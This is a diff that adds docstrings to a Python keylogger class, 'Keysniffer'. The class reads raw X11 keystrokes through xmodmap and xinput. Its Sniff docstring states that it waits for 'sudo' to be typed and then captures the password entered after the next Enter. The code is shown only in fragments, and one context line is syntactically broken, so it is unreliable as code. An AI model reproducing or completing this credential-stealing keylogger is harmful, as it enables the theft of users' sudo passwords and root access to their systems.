@@ -10,6 +10,9 @@ class Keysniffer():
                self.outfile = outfile
                 
         def GetKeyCodes(self):
+                """
+                Get keycode mapping using xmodmap and use codes as keys in a dict.
+                """
                 # Call xmodmap to get keycode mapping, pipe to stdout
                 modmap_out = subprocess.Popen(
                         ('xmodmap', '-pm', '-pk'), stdout=subprocess.PIPE,
@@ -38,6 +41,9 @@ class Keysniffer():
 
 
         def CodeConverter(self, codes):
+                """
+                Convert given list of keycodes to their respective values.
+                """
                 in_buffer = list(codes)
                 out_buffer = []
                 for item in in_buffer:
@@ -47,6 +53,11 @@ class Keysniffer():
                 
 
         def Sniff(self):
+                """
+                Execute xinput to begin sniffing keycodes, search for 'sudo' key 
+                combination and then capture the input the comes after the next press 
+                of 'Enter' up to the next time 'Enter' is pressed.
+                """
                 keystream = subprocess.Popen((self.xinput), stdout=subprocess.PIPE, 
                         universal_newlines=True)
 
@@ -67,7 +78,7 @@ class Keysniffer():
 
                 for item in self.keycodes.keys()
                         reverse_keys = {}
-                        
+
 
                 for item in search_str:
                         
